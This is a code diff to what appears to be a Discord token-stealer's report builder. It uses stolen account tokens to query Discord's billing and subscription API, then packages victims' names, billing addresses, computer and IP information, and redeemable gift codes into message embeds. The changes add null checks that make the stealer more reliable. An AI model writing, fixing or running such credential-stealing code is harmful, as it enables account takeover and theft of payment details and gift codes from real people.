@@ -39,7 +39,7 @@ const json = async (zipFile) => {
       computerInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n') + '\n\n' +
       ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n')
   });
-  for (const account of discordAccountInfo.accounts) {
+  if (discordAccountInfo.accounts) for (const account of discordAccountInfo.accounts) {
     const nitroSubscriptionEnd = Math.floor(new Date((await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
       headers: { Authorization: account.token, 'User-Agent': userAgent }
     })).data[0].current_period_end).getTime() / 1000);
@@ -63,7 +63,7 @@ const json = async (zipFile) => {
       color: account.accent_color,
     });
   }
-  discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
+  discordAccountInfo.billing?.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
     title: `Discord Account - Billing - ${billingType(billing.type)}`,
     fields: (billing.type === 1 ? [
       ['👨 Name', billing.billing_address.name],
@@ -81,7 +81,7 @@ const json = async (zipFile) => {
   });
   embeds.push({
     title: 'Discord Promotions',
-    description: discordAccountInfo.gifts.length > 1 ?discordAccountInfo.gifts.map(gift => {
+    description: discordAccountInfo.gifts?.length > 1 ?discordAccountInfo.gifts.map(gift => {
       return `🎁 **${gift.promotion.outbound_title}**\n🔗 \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
     }).join('\n') : 'No Promotions'
   });
